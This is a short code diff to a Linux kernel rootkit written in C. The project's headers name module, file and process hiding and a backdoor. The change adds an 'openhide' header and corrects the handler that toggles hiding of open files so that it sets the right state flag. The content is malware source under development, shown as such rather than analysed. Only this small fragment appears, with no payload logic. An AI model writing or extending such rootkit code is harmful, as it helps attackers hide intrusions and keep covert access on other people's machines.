@@ -8,6 +8,7 @@
 #include "common.h"
 #include "modhide.h"
 #include "filehide.h"
+#include "openhide.h"
 #include "backdoor.h"
 #include "pidhide.h"
 #include "ioctl.h"
@@ -133,10 +134,10 @@ handle_openhide(unsigned long arg)
 
     if (sarg > 0 || (!sarg && (set ^ 1))) {
         hide_open();
-        rootkit.hiding_files = 1;
+        rootkit.hiding_open = 1;
     } else if (sarg < 0 || (!sarg && !(set ^ 1))) {
         unhide_open();
-        rootkit.hiding_files = 0;
+        rootkit.hiding_open = 0;
     }
 
     DEBUG_NOTICE("openhide %s\n", rootkit.hiding_open ? "on" : "off");
